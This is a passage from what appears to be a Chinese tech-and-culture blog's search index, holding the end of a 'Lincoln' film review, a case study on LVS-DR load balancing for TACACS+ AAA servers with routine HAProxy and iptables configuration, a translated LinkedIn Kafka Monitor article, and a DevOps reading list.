1）协调众议院党团充分信任、倚重““党鞭”，确保共和党议员可以一致行动2）巩固共和党内保守派支持同意任命保守派领袖为总统特使，与南方邦联接触，展开秘密和平谈判，安抚保守派要求迅速结束战争的诉求。3）团结共和党内激进派林肯属于保守派，而激进派的诉求包括彻底废除奴隶制、严厉惩罚南方邦联、赋予黑人投票权等一系列在当时比较“激进”的政策主张，显然是与林肯的施政纲领是冲突的。甚至于私人关系方面，激进派领袖斯蒂文斯，曾经领衔调查第一夫人的“财务问题”，因而两家人的关系一度很僵。林肯凭借个人的人格魅力，亲自与斯蒂文斯沟通，互相妥协，在宪法修正案的问题是达成了战略合作。 战术上，针对民主党议员展开全面公关 由国务卿苏华德亲自领导，成立了一个秘密的“拉票小分队”。特别针对60多名即将届满的民主党众议员，实施全面地地下公关行动，力求再争取中间摇摆的、关键性的20张赞成票，从这个角度看，这些行动又是战略性的。1)直接金钱贿赂能用钱解决的绝不多说半句废话。2)间接职务贿赂利用林肯政府掌握的人事任命权，为即将失业的众议员提供“工作机会”。3)其它政治利益交换 最后关头，林肯亲自出马展开温情攻势 对于关键少数票，林肯亲自出马，或邀请面谈，或登门拜访，一家一家作工作，晓之以理、动之以情，这总统当得也是没谁了。 三、人物形象 多数历史书籍写的都是历史事件，只是偶尔写到在历史上起了作用的人物。 这部电影的成功之处还在于，以林肯为中心，塑造了一批该时代的精英人物形象。 3.1 林肯本剧中丹尼尔·戴-刘易斯的演技几近逆天，将林肯的多重形象巧妙融合： 忧郁症患者：本剧中的林肯形象，总体上温文尔雅、谦逊有礼，但是总给人一种阴郁、忧伤的气质。无论是现实中，还是美国人民的印象中，林肯是一个苦命的人。包括但不仅限于：出身于贫寒家门、初恋女友有缘无份，第一夫人是贵族千金但是出了名的尖酸刻薄长得丑，长期没有固定职业、屡战屡败、多次落选、幼子早殇…… 段子手：全剧中有好几个精彩片段，林肯在众人一片惊恐、绝望的情况下开始讲故事，幽默风趣，极尽调侃，引得众人忍不住发笑，很快就扭转了现场的气氛。也许得益于林肯早期自学时期，熟读莎士比亚著作的缘故，这也从另外一个角度阐释了，林肯作为领导者的人格魅力。我想大家都会喜欢这样的领导。 政治家：反对派在议会演讲中称林肯为“凯撒、独裁者”。虽然在日常镜头中，导演力求表现林肯谦逊、温情的一面，但是在关键时刻，也把他作为政治家的一面表现得淋漓尽致。 伟大的领导是一种特有的艺术形式，既需要超群的力量，有需要非凡的想象力。 林肯对于施政目标——废除奴隶制，有着坚定的、无可动摇的信念。不但先于群众找到通向未来的道路，还在精英集团都无所适从的时候，敢于坚持自己的见解。 林肯认识到自己的命运所向，而且对此深信不疑，这成了他毕生的动力。 剧中有很多林肯和幕僚争论的场面，其历史背景是林肯内阁组成上的政治包容性。首席幕僚、国务卿／外交部长苏华德，财政部长蔡斯（剧中未直接出线），入阁以前是林肯的党内竞争对手、死对头，战争部长斯坦顿（民主党）经常当着林肯和众人的面大声咆哮，阁员中有保守派、有激进派、甚至有些原来是反对者。作为帝国CEO，不仅仅是团结众人，还要做到用人不疑、委以重任、肝胆相照，林肯以自己的谦逊和雅量，缔造了一支史上最强幕僚团队。 ####3.2 第一悍妇 对于玛丽·托德，她也许是最令美国人反感的第一夫人。林肯是穷小子出身、自学成才，她则生于“钟鸣鼎食”之家，祖上州长、将军、大企业家一箩筐，从小接受的是是贵族教育；林肯朴素、谦逊、温和，第一夫人则是出了名的傲慢、狂躁、尤其喜好奢华。在某种程度上说，人们对于林肯的敬仰中包含了深深的同情，正如戴尔·卡耐基的评价是：林肯一生最大的不幸不是他的遇刺，而是他和玛丽·托德的婚姻！ 但是，斯皮尔伯格似乎想通过本片挑战这一常识。为了塑造第一夫人的“强悍”形象，导演选择从“家事”入手。林肯“非常喜爱孩子”，夫妻二人对自己的孩子也并不算严厉，他们共育有四个孩子，但是有三个夭折，罗伯特是唯一活到成年并育有子女的。孩子的死亡对林肯夫妇的影响巨大，玛丽后来因孩子和丈夫的死深受折磨。 在南北战争期间，母亲玛丽·托德·林肯始终不肯让罗伯特加入联邦军，在战时舆论中，成为反对派攻击林肯的把柄，即便如此，玛丽依然不肯做出任何让步，这使得林肯总统甚为难堪。影片中有好几个林肯夫妻为此吵架的镜头，歇斯底里、虐心、虐得一滩糊涂。 一直至战争结束前不久，罗伯特才得以参军。1865年2月11日，罗伯特·林肯以上尉军衔被任命为助理副官，并在战争结束前几周作尤利西斯·格兰特将军的直属幕僚之一，但这个职位却使得罗伯特能实际上战场的可能性大大降低。 与此同时，影片中的玛丽也充分表现出“第一夫人”的气度。她是林肯的“巫师”，第一个读懂了林肯推动第十三条修正案的决心；虽然她自己也觉得难度很大，但是很快就转变态度，进而全力支持林肯的主张；利用一切可能的机会，包括邀请自己非常讨厌的激进派领袖史蒂文斯参加自己的宴会；旁听国会辩论的时候，完全展现出大政治家的敏锐眼光，在最后的投票环节，更是亲自点票…… 通过这些镜头上，银幕上一个名副其实的“第一悍妇”活了。 真实的历史上，林肯遇刺之后第一夫人的晚景极为凄凉。也许是为了弥补这一缺憾，也许是为了表达崇敬，法案通过之后，林肯夫妇有一组异常华美的马车旅行镜头，夫妇二人达成和解，正准备自己的旅行计划呢，蓝天、白云、青草地，春风得意马蹄疾。历史真是残酷。 3.3 精英群像超过140个历史人物 在当年那些日子是美国人对政府最缺乏信心的时候，这个故事可以显示人如何在民主体制之下完成奇迹，成就美好的事物。—编剧Tony Kushner 在这个历史的重大时刻，在有关宪法修正案的争论之中，有多大140个角色登场，每个人都个性鲜明，每个人都举足轻重。国务卿苏华德（William Henry Seward）、共和党创党人布萊尔（Francis Preston Blair）、众议员斯蒂文斯（Thaddeus Stevens）、格兰特将军，甚至包括林肯的“敌人们”：罗伯特李将军、南方邦联副总统、在国会坚决抵制法案通过、甚至威胁要弹劾总统的反对派议员们，专门搞地下交易的政治掮客，媒体记者团…… 黄金配角：侠骨柔肠 伟大的历史都是由群体构建，剧中最耀眼的一个当属众议院议员史蒂文斯（Thaddeus Stevens），饰演者是银幕铁汉李琼斯（Tommy Lee Jones）。斯蒂文斯是共和党激进派的领袖，来自宾夕法尼亚州、众议院最具分量的一员，林肯的战略盟友。 他是林肯夫人眼中的魔鬼，不仅在政见上经常与林肯相左，还利用执掌众议院预算委员会的权力，对白宫的财务进行调查；他具备政治家的凶狠、老辣，三两句话就让摇摆不定的民主党议员屈服；他审时度势，在关键时刻能够以身殉道，指引自己迷茫的同志；他在众人面前孤独、冷漠，国会演讲中却能进退有据、智慧幽默、气场十足；他不仅在政治场面上唱得了高调，个人生活中也能超越种族、践行平等精神；伟大的胜利时刻，众人自觉起立致敬英雄，他心里惦记的倒是赶紧回家，将法案的文本作为礼物送给家中的黑人妻子。所谓“侠之大者”，不过如此吧。 六、结束 当一出戏闭幕时，观众鱼贯退出剧场，回家去继续他们正常的生活；而当一位领袖的生涯结束、落下帷幕时，观众自己的生活也就起了变化，同时历史的进程也可能会发生深刻的变化。 法案通过、漫长的战争结束，举国享受和平的平静中，林肯的生命嘎然而止。在众人簇拥的小黑屋，躺在床上的身躯笼罩在一片白光之中，宛如耶稣离世。在此一刻，他重返天国，已然封神。 Preview 更新完善《林肯》人物关系简谱、精彩对白剪辑与台词校对 阅读原著《Team of Rivals: The Political Genius of Lincoln》 参观林肯纪念堂、参观葛底斯堡、背诵《葛底斯堡演说》 资源 The Book That Preserved What African Americans Who Knew Abraham Lincoln Thought of Him 参考文献 《 林肯传》 《美国宪法及其修正案》商务印书馆 《通过法律的社会控制》商务印书馆 《美国历届总统小传》新华出版社 《弗吉尼亚笔记》商务印书馆 《领导者》,世界知识出版社 解读纸牌屋（四）从幕僚长说起——美国官员的班底,2015 | 封楚诚 如何流利背诵《葛底斯堡演讲》| 原创 2016-08-17 恶魔奶爸Sam]]></content>
      <tags>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Art</tag>
        <tag>Lincoln</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于LVS的AAA负载均衡架构实践]]></title>
    <url>%2F2016%2F09%2F01%2FAAA%2F</url>
    <content type="text"><![CDATA[基于LVS的AAA负载均衡架构实践概要本次分享将从一次实际的负载均衡改造案例出发，通过介绍项目背景、选型思路、测试方法和问题分析等方面展开，总结负载均衡架构的一般套路和经验教训。 一、背景项目背景是某企业的AAA管理系统， AAA 即 Authentication（认证）、Authorization（授权）、Accounting（记账），是网络设备的一种集中化管理机制，可以在不同设备上为用户设置不同的权限，对网络安全起到监视作用。 AAA服务是基于TACACS+协议（Terminal Access Controller Access Control System Plus），TACACS＋是在 TACACS 协议的基础上进行了功能增强的安全协议，最早由Cicso提出并开放标准。该协议与 RADIUS 协议的功能类似，采用客户端/服务器模式实现 网元与 TACACS+ 服务器之间的通信，使用TCP 49端口。 每次TACACS+ 交互主要实现：认证 (Authentication): 确认访问网络的用户身份，判断访问者是否合法授权( Authorization ): 对通过认证的用户，授权其可以使用哪些服务记账( Accounting )：记录用户的操作行为、发生时间 1.问题描述系统架构如下图所示，服务器采用一主一备模式，一般情况下由Master服务器处理请求，如果它故障或者负荷过高、无法快速响应请求，网元会将请求发送到BackUP服务器处理。AAA Server上运行守护进程处理请求，记为TACACSD。 容量计算 &gt;服务端资源需求T＝ 认证请求规模g(n) ／ TACACSD运算能力 f(n) 在很长一段时间内，原有架构可以满足应用需求，但是随着集中化的深入推进，资源不足的问题日益严重：Master负荷早已爆满，BackUP的负荷也几乎与Master相当，而且请求从Master切换到BackUP的时候，非常容易引起失败。主要有三个关键因子的变化：1、管理设备数量增长10倍，而且还要继续增长2、网络配置自动化，单一网元的巡检、配置操作有数量级的提升3、TACACSD程序本身存在性能瓶颈，CPU消耗随着设备数量增长而增长 前两个因素属于业务需求，不能调整，程序性能问题涉及开发周期问题（这块以后再单独分析），迫于业务压力，我们必须快速寻找一种变通方案。 2.选型要求在选择适用方案之前，我们必须考虑以下几个要求： 可伸缩性（Scalability）当服务规模（设备数量、自动化操作次数）的负载增长时，系统能被扩展来满足需求（弹性扩展服务能力），且不降低服务质量。 高可用性（Availability）尽管部分硬件和软件会发生故障，整个系统的服务必须是每天24小时每星期7天可用的。（必须去除原来过于依赖单一服务器的瓶颈） 可管理性（Manageability）整个实现应该易于管理，提供灵活的负载均衡策略支持。 价格有效性（Cost-effectiveness）整个实现是经济的。这个怎么说呢，比如这个问题吧，有人说：买四层交换机啊？ 没钱！宇宙上最好服务器来一台？ 没钱！！于是我们的主要探索方向放在了开源软件，感谢开源社区解救穷人。 二、前戏我们首先想到的是HAProxy，一款经典的负载均衡开源软件。特别是具备以下几个特点：配置维护简单，支持热备，支持后端服务器的状态检测，可以自动摘除故障服务器；支持TCP 代理；支持Session的保持。 tcpThe instance will work in pure TCP mode.A full-duplex connection will be established between clients and servers,and no layer 7 examination will be performed. This is the default mode. It should be used for SSL, SSH, SMTP, … 12345678vi haproxy.cfglisten AAA-Cluster mode tcp bind 49 option tcplog source 0.0.0.0 usesrc clientip server AAA-Server-210 192.168.3.10:49 server AAA-Server-211 192.168.3.11:49 1.HAProxy+TProxy当我们满怀希望地推进之时，一个要命的问题摆在面前：后端的AAA服务器上看到的连接的Source IP都不再是用户原始的IP，而是前端的HAProxy服务器的IP， 官方文档对于source调度算法的描述： sourceThe source IP address is hashed and divided by the total weight of the &gt;running servers to designate which server will receive the request.This ensures that the same client IP address will always reach the sameserver as long as no server goes down or up.If the hash result changes due to the number of running serverschanging, many clients will be directed to a different server. TACACSD进程必须获取到认证请求的Source IP，为此我们尝试引入TProxy。它允许你”模仿”用户的访问IP，就像负载均衡设备不存在一样，TProxy名字中的T表示的就是transparent(透明)。当网元发起的认证请求到达后端的AAA服务器时，可以通过抓包看到的请求Source IP就是网元的真实IP。 即使用上“HAProxy+TProxy”的组合拳，还是存在另外一个问题：设备对于认证结果报文，似乎需要请求报文的目标地址（代理服务器）与结果报文的发送端（Real AAA Server）一致。 过程描述：网络设备会发送该用户的凭证到 TACACS+ 服务器进行验证，然后决定分配访问相关设备的权限，并将这些决定的结果包含在应答数据包中并发送到网络设备上，再由网络设备发送到用户终端。至于是否真的是这个校验规则，或者我们还没有找到更好的解释。暂且搁置，引述一段RFC 1492的说明，日后再补充这个问题。CONNECT(username, password, line, destinationIP, destinationPort)returns (result1, result2, result3) This request can only be issued when the username and line specifyan already-existing connection. As such, no authentication isrequired and the password will in general be the empty string. Itasks, in the context of that connection, whether a TCP connectioncan be opened to the specified destination IP address and port. 2.IPTABLES NAT为了解决上述Proxy无法传递Source IP 的问题，我们还尝试过基于 iptables 实现网络地址转换的方式，It’s Working !!1iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 49 -j DNAT --to 192.168.3.10-192.168.3.13 如上即可解决HAProxy的Source IP 传递和报文回路的问题。压力测试的时候，开始设备数比较少的时候，各项业务还很正常，当设备数加到1.5万台左右，或者几百台设备并发请求的时候，报文转发的时延久急剧上升，甚至出现丢包情况。这个方案对我们来说显然存在性能瓶颈。 HAProxy—&gt;HAProxy + TProxy —&gt;IPTABLES NAT 转了一圈，回到起点。 三、终极杀器经过之前一波三折的折腾，我们决定启用一款终极杀器：LVS。LVS即Linux Virtual Server，是一个虚拟的服务器集群系统。它有三种工作模式NAT(地址转换),IP Tunneling(IP隧道)、Direct Routing(直接路由)。 NAT模式 TUN模式 DR模式 Server any Tunneling Non-arp device Server Network private LAN/WAN LAN Server Number low(10-20) HIGH(100) HIGH(100) Server Gateway load balancer own router own router 基于之前NAT方面的不良体验，我们这次直接选择了LVS-DR模式，LVS支持八种调度算法，我们选择轮询调度（Round-Robin Scheduling）。 LVS只处理一般连接,将请求给后端real server,然后由real server处理请求直接相应给用户,Direct Routing与IP Tunneling相比，没有IP封装的开销。 缺点：由于采用物理层,所以DR模式的调度器和后端real server必须在一个物理网段里,中间不能过路由器。 另外，为了防止LVS控制机的单点故障问题，还选用了Keepalived，负责LVS控制机和备用机的自动故障切换。 LVS依赖项：IPVS内核模块和ipvsadm工具包。具体配置不做过多说明，可以自行检索，关键注意以下几点：1）检查服务器是否已支持ipvs modprobe -l |grep itvs2）检查依赖包：rpm -q kernel-develrpm -q gccrpm -q opensslrpm -q openssl-develrpm -q popt3）配置realserver节点ARP及VIP绑定脚本 vi /etc/init.d/lvs4）启动LVS-DR/etc/init.d/lvsdr start5）查看VIP 情况ip addr list6）启动realserver节点LVS /etc/init.d/lvs start 五、小结1. 各种负载均衡实现在网络中的位置 四层负载均衡的特点一般是在网络和网络传输层(TCP/IP)做负载均衡，而七层则是指在应用层做负载均衡。四层负载均衡对于应用侵入比较小，对应用的感知较也少，同时应用接入基本不需要对此做特殊改造。七层负载均衡一般对应用本身的感知比较多，可以结合一些通用的业务负载逻辑做成很细致的方案，比如我们通常用HAProxy/Nginx来做网站流量的分发。 实践再次教育我们，天下没有一招鲜，任何技术都有它的江湖位置。 2. 仿真能力这次实践可以用一句话概括就是：“成也仿真，败也仿真”。起初走了很长一段弯路，可以说是因为对整个负载均衡体系的理解不深入，也可以说是测试不足导致，凭着惯性，想当然地认为可以简单复制原来的“经验”，而忽视了实验环境的构建。 后来可以快速推进，是因为重新规整了测试方法和目标，并且基于虚拟机搭建了验证环境，包括引入了可以仿真路由器的GNS3平台，完整地测试了真实的业务流程。LVS集群环境也是先完成构建、试运行一段时间之后才完成的业务割接。 IPTABLES NAT的方案并没有在早期发现性能瓶颈，也说明这快的测试能力不足。 3.花边故事HAProxy的官网目前是被封锁的，国内不翻墙访问不了，Why ?在他们家的操作手册后面有LVS、Nginx的推荐链接。以前并没有注意。 TPROXY最早是作为Linux内核的一个patch，从linux-2.6.28以后TPRXOY已经进入官方内核。iptables只是Linux防火墙的管理工具而已，位于/sbin/iptables。真正实现防火墙功能的是Netfilter，它是Linux内核中实现包过滤，如果要探讨Netfilter，又会是一个很长的故事。 LVS开始于1998年，创始人是章文嵩博士，从Linux2.4内核以后，已经完全内置了LVS的各个功能模块。到今天为止，依然是目前国内IT业界达到Linux标准内核模块层面的唯一硕果。章博士同时是前淘宝基础软件研发负责人、前阿里云CTO，三个月前刚转会到滴滴打车任副总裁。淘宝技术体系曾大规模使用了LVS，不过最新消息，淘宝的同学已经鼓捣出一个VIPServer，正逐步替代了LVS。 罗列的这几条信息，其实与这次的主题关系不大，但确是整理这次篇帖子过程中，感觉很有意思的事情。技术并不冰冷，它就像个江湖，到底还是关于人的故事。 续集 可能更新，也可能不更新，看天意。 1、本次场景中， HAProxy方案为什么会失败？还缺少一个深度解释。2、本次场景中，LVS方案采用默认的轮询算法是否最优？3、本次场景中，7X24系统如何完成服务切换？4、本次场景中， IPTables NAT 的性能瓶颈如何解释？5、来一个关于Netfilter的讨论 扩展阅读 Facebook Open-sourcing Katran, a scalable network load balancer VIPServer: A System for Dynamic Address Mapping and Environment Management 参考文献 章文嵩博士和他背后的负载均衡帝国 章文嵩：怎样做开源才有意义？ 胥峰(盛大):KVM部署LVS集群故障案例一则 iptables CLUSTERIP构建独特的负载均衡集群 | 赵亚，2017-09-16 Google 是如何做负载均衡的？| 2017-01-03 oilbeater TGO鲲鹏会]]></content>
      <tags>
        <tag>最佳工程实践</tag>
        <tag>架构师</tag>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：Kafka]]></title>
    <url>%2F2016%2F08%2F15%2FOpenSource-Kafka%2F</url>
    <content type="text"><![CDATA[摘要 一、How Kafka Works 二、Kafka Application：基于 Kafka 构建事件溯源模式的微服务 三、Kafka Operation：LinkedIn 开源 Kafka Monitor 一、How Kafka Works Kafka is a log and not a queue. 二、Kafka Application 基于Kafka构建事件溯源模式的微服务讨论如何借助Kafka实现分布式消息管理，使用事件溯源（Event Sourcing）模式实现原子化数据处理，使用CQRS模式（Command-Query Responsibility Segregation ）实现查询职责分离，使用消费者群组解决单点故障问题，理解分布式协调框架Zookeeper的运行机制。整个应用的代码实现使用Go语言描述。 三、Kafka OperationLinkedIn开源Kafka Monitor 一个关于Kafka的监控测试框架 LinkedIn.com:Open Sourcing Kafka Monitor Apache Kafka 已经成为了一个面向大规模流数据的，标准的消息系统。在Linkedin这样的公司，它被用作各类数据管道的主力，支持一系列关键服务。它已经成为确保企业基础架构健壮、容错和高性能的核心组件。 在过去,网站高可用工程师（SRE）必须依赖Kafka服务器的报告来度量、监控一个Kafka集群（例如，访问流量，离线分区计数，under-replicated分区计数，等等）。如果任何一个指标不可用，或者任何指标的值是异常的，都有可能是某些方面出错了，SRE则 需要介入问题排查。然而，从一个Kafka集群获得这些指标并不像听起来那么容易—无论集群是否可用，一个很低的流入流出值并不没有必要告诉我们，也不能为最终用户提供一个基于可用性经验的、细粒度的参考结果(比如说，在这个事件中描述道：只是一个分区的子集异常了）。随着我们的集群增长得愈加庞大，为越来越多的重要业务提供服务，可靠、精确地度量Kafka集群可用性的能力，也就变得越来越重要。 为了监控可用性，有必要主干的稳定性，从功能上或性能方面尽可能早的捕获可回溯的信息。Apache Kafka 在虚拟机中包含一系列单元测试和系统测试方法，用于检测错误。到目前为止，我们仍然能发现一些偶发错误，它们直到Kafka在真实的集群中已经部署很多天甚至几周之后才显现。这些错误会引起许多运行时开销或者导致服务中断。有些时候该问题很难被重现，SRE工程师只能在开发者找到原因之前回退到上一个版本，这显然要增加Kafka的部署和维护成本。在许多情况下，这些错误可以在更早的阶段就被探查出来，假如我们可以在一个具备多样化故障转移的环境部署Kafka，同时加载生产规模的流量、延长持续时间。 Kafka Monitor 是一个监控测试Kafka部署情况的框架，可以帮助我们针对上面的不足提供以下能力： （a）在生产集群持续监测SLA （b）在测试集群持续进行回归测试。在最近的 KafkaSummit 我们已经宣布在 Github上开源 Kafka Monitor。接下来我们将继续开发 Kafka Monitor 并把它作为我们事实上的Kafka认证解决方案。我们希望它也能使别的公司从中收益，那些希望验证和监控它们自己的Kafka部署情况的公司。 设计概览Kafka Monitor 使得这些事情变得很容易：在真实的生产集群中，开发和执行长时间运行特定的Kafka系统测试，基于用户提供的SLA监控已经部署的Kafka。 开发者可以创建新的测试，通过组装可复用的组件，用来仿真各种各样的场景（例如 GC 中断，代理被硬杀，回滚，磁盘故障，等等），收集指标；用户可以运行 K afka Monitor测试用例，在这些场景执行的时候可以伴随用户定义的定时任务，无论是测试集群还是生产集群，都能够验证，Kafka在这些场景下，是否能够达到预期效果。 为了实现上述目标，Kafka Monitor 的设计模型包含一系列测试结果收集器和服务。 一个Kafka Monitor 实例运行在一个单独的Java进程，在相同的进程里可以再产生多个测试用例和服务。下面的示意图表达了服务，测试用例和Kafka Monitor实例之间的关系，也可以知道Kafka Monitor 如何在Kafka集群和用户之间相互作用。 测试一个典型的测试，将仿真一系列场景，基于某些前期已经定义的定时任务，需要启动一些生产者／消费者，上报指标，验证指标值是否符合前期定义的断言。举个例子，Kafka Monitor 能够启动一个生产者，一个消费者，每五分钟反射一个随机代理（比方说，如果说它是监控一个测试集群）。Kafka Monitor 接下来就可以度量可用性，消息丢包率，揭露JMX指标，用户可以在一个实时的健康仪表盘看到这些信息。 如果消息丢包率比一些阀值还要大，它能发出告警，这些阀值基于用户特定的可用性模型确定。 服务我们概括了仿真逻辑，针对持续长时间场景的服务，目的是为了加快、简化从复用组件组装测试的过程。一个服务将再产生它自己的线程，去执行那些场景、测量指标。举例说明，我们现在已经具备如下服务： [ ] 生产者服务，生成Kafka消息，测量生产速率和可用性指标。 [ ] 消费者服务，消费Kafka消息，测量消息丢包率，消息复制速率以及端到端时延。这些服务依赖于生产者服务来提供消息，它会嵌入一个消息序列号和时间戳。 [ ] 代理反射服务，能够基于预定义的定时任务提供一个发射代理。 一种测试需要由许多服务组成，验证一系列超时场景。举例来说，我们可以创建一个测试，包含一个生产者服务，一个消费者服务，以及一个代理反射服务。这个生产者服务和消费者服务，将被配置为从同一个主题发送和接收消息。那么这个测试将验证消息丢包率持续为0。 使用多个Kafka Monitor实例进行集群间性能测试当所有的服务和相同的Kafka Monitor实例必须运行在同一个物理机器上的时候，我们可以启动多个Kafka Monitor 实例在不同的集群，一起协作完成一个精密控制的端到端测试。在下面这个测试示意图中，我们启动了两个Kafka Monitor 实例在两个集群中。第一个Kafka Monitor 实例包含一个生产者服务，提供给Kafka 集群1。消息从集群1反射到集群2。最后，在第二个Kafka Monitor 实例的消费者服务，处理了消息，来自集群2中的同一个主题，并且报告了通过集群通道的端到端时延。 Kafka Monitor 在LinkedIn的应用 监控Kafka集群部署情况在2016年早些时候，我们部署了Kafka Monitor用来监控可用性和端到端时延，包括LinkedIn的每一个Kafka集群。本项目的 wiki 展示了更多细节，以及这些指标是如何度量的。这些基本但是关键的指标，对于积极地监控我们Kafka集群的SLA非常有用。 在端到端工作流中验证客户端库正如早先发布的一篇BLOG中说明的那样，我们有一个客户端的库，缠绕在普通的Apache Kafka生产者和消费者，用于提供一些 Apache Kafka 无法支持的特性，例如Avro编码，审计和大消息支持。我们也有一个REST客户端，它允许非JAVA应用程序从Kafka生产和消费数据。这些客户端库和每一个新的Kafka release版本，验证它们的功能可用性是非常重要的。Kafka Monitor允许用户将客户端库作为插件，加入到它的端到端工作流中。我们已经部署的Kafka Monitor实例，已经在测试中使用我们封装的客户端和REST客户端，用于验证它们的性能和功能，使得这些客户端库和Apache Kafka的每一个新的release版本都能符合要求。 验证Apache Kafka新的内部Release版本我们通常每个季度都会从Apache Kafka的主干版本复制代码，然后建立一个新的内部release版本，或者吸收Apache Kafka新的特性。从主干复制代码的一个重要的收益就是，部署Kafka到LinkedIn的生产集群之后，通常能在Apache Kafka的主干版本上探查到一些问题，这样的话我们就能在Apache Kafka 官方正式的release发布之前获得修复。基于复制Apache Kafka主干版本可能存在的风险，我们做了额外的工作，在一个测试集群中验证每个内部release版本—从生产集群中获得镜像流量—几周以前生产环境部署新的release。举例来说，我们执行回退或者硬杀掉代理的时候，需要检查JMX指标去验证确实有一个控制进程并且没有离线分区，为了验证Kafka在故障迁移场景中的可用性。在过去，这些步骤都是手工进行的，非常消耗时间，并且我们有大量事件和许多场景需要测试，这种方式的伸缩性就非常差。我们切换到Kafka Monitor之后，这个过程就自动化了，并且可以覆盖更多故障迁移的场景，而且是可以持续进行的。 相关工作的比较Kafka Monitor 对其它公司而言也是有用的，可以帮助验证他们自己的客户端库和Kafka集群。当然 Microsoft 也已经在 Github 上有了一个开源项目，也是监控室Kafka集群的可用性和端到端时延。同样地，在这篇发表的博客中，Netflix介绍了一种监控服务，即发送持续的心跳消息，同时度量这些消息的时延。Kafka Monitor自己的特点就是专注于可扩展性，模块化以及客户端库和多样化场景支持。 开始Kafka Monitor的源代码可以从 Github 下载，基于Apache 2.0 授权协议。使用指南，设计文档和未来规划在README文件和项目wiki中可以查阅。我们很乐于听到你对该项目的反馈意见。当Kafka Monitor被设计用来作为，测试和监控Kafka部署情况的框架的时候，我们视线了一个基本的但是有用的测试，确保你能开箱即用。这些测试可以度量可用性，端到端时延，消息丢包率以及消息复制速率，通过运行一个生产者和一个消费者，它们使用同一个主题生产／处理消息。你可以在终端看到这些指标，基于HTTP GET请求、程序化地获得它们的值，甚至随着时间查看它们的值，通过一个简单（快速启动）的图形界面，如下面的截图所示。关于如何运行测试、查看指标的详细介绍内容请参阅项目网站。 未来的工作我们的计划中有许多工作要做，改进、提升 Kafka Monitor，使它更有用。 增强测试场景每次执行代码 check-in 的时候，Apache Kafka 包含了一大批系统测试。我们计划在Kafka Monitor中实现一个简单的测试，然后部署到LinkedIn的测试集群，最终做到持续运行这些测试。这使得我们可以在问题发生的时候进行性能回溯，还可以验证各种特性的是否可用，例如限额、管理操作，授权，等等。 整合Graphite和类似的框架它对用户来说非常有用，可以在他们的组织内，通过一个简单的 web 服务查看所有跟 Kafka 相关的指标。我们计划在 Kafka Monitor 中提升现有的报表服务，这样用户就能够导出 Kafka Monitor 的指标到 Graphite 或者他们选择的其它框架 整合故障注入框架我们也计划将 Kafka Monitor 与故障注入框架整合（名叫 Simoorg），可以测试、收集Kafka在更全面的故障迁移场景中的处理能力，例如磁盘故障或者数据错误。 扩展阅读：开源架构技术漫谈 Stack Overflow：2017年最赚钱的编程语言 玩转编程语言:构建自定义代码生成器 远程通信协议：从 CORBA 到 gRPC 基于Kafka构建事件溯源型微服务 LinkedIn 开源 Kafka Monitor 基于Go语言快速构建一个RESTful API服务 应用程序开发中的日志管理(Go语言描述) 数据可视化（七）Graphite 体系结构详解 参考文献 LinkedIn使用Kafka进行关键业务消息传输的经验总结 | 秦江杰@QCon]]></content>
      <tags>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈系列]]></title>
    <url>%2F2016%2F07%2F28%2FDevOps%2F</url>
    <content type="text"><![CDATA[摘要 DevOps 实践的本质是文化 持续交付 学习力 工程师的自我修养 “开发运维” 这个词最初是在2008年1由帕特里克·德布瓦和安德鲁·谢弗提出的，并于 2009 年因为约翰·阿斯帕尔瓦和保罗·哈蒙德那场著名的“每天超过10次部署：Flickr的开发与运维合作”演讲，在 Velocity 技术大会广为流传。 DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 扩展阅读：分布式追踪系统 DevOps 漫谈：开源分布式跟踪系统 OpenCensus DevOps 漫谈：分布式追踪系统标准体系 远程通信协议：从 CORBA 到 gRPC 应用程序开发中的日志管理(Go语言描述) DevOps 资讯 | LinkedIn 开源 Kafka Monitor 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 构建 Gradle Tutorials and Guides 灵活强大的构建系统 Gradle | 美团点评技术团队 | bob ·2014-08-18 15:41 虚拟化 2018 年度 Docker 用户报告 - Sysdig Edition Cyber-Security: Linux 容器安全的十重境界 DevOps漫谈：Docker ABC Books 《凤凰项目|The Phoenix Project》 《持续交付：发布可靠软件的系统方法》 《Kanban 看板实战》 《SRE：Site Reliability Engineering》 《DevOps Automation Cookbook》 一些有趣的电子书 参考文献 约翰·威利斯，“开发运维的融合”，2012年“IT变革新闻”（博客），2014年 约翰·阿尔斯帕瓦和保罗·哈蒙德，“一天超过十次部署：Flickr 公司的开发与运维协同”，O’Reilly Web 性能与运维大会网站（O’Reilly Velocity Conference website），2009年6月23日]]></content>
      <tags>
        <tag>最佳工程实践</tag>
        <tag>架构师</tag>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[政府行为模型及预测：关于出版业的过去、现在和将来]]></title>
    <url>%2F2016%2F07%2F28%2FPolicy-Publish%2F</url>
